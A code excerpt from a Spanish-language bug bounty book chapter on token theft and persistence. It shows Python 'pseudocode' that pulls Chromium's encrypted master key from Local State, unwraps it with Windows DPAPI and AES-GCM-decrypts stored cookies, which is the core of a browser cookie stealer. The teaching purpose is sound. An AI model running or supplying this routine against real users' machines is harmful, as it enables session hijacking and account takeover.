# Extraído de: LibroBugBounty/cap-15-token-theft-persistencia.md
# Pseudocódigo del descifrado con DPAPI activo
import win32crypt  # CryptUnprotectData
import json, base64
from Crypto.Cipher import AES

# 1. Leer clave maestra cifrada de Local State
with open(local_state_path) as f:
    encrypted_key = base64.b64decode(
        json.load(f)["os_crypt"]["encrypted_key"]
    )[5:]  # Quitar prefijo "DPAPI"

# 2. Descifrar clave maestra con DPAPI (requiere sesión del usuario)
master_key = win32crypt.CryptUnprotectData(encrypted_key)[1]

# 3. Descifrar cookie individual
nonce = encrypted_value[3:15]     # 12 bytes después de "v10"
ciphertext = encrypted_value[15:]
cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
decrypted = cipher.decrypt(ciphertext)
